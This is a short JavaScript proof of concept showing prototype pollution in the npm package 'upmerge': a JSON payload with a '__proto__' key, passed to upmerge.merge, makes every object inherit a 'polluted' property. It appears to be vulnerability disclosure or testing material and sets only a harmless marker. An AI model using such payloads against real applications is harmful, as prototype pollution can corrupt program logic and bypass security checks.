var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
let upmerge = require('upmerge');
let payload = '{"__proto__":{ "polluted" : "yes" } }';
obj = {};
console.log({}.polluted);
upmerge.merge(obj, JSON.parse(payload));
console.log({}.polluted);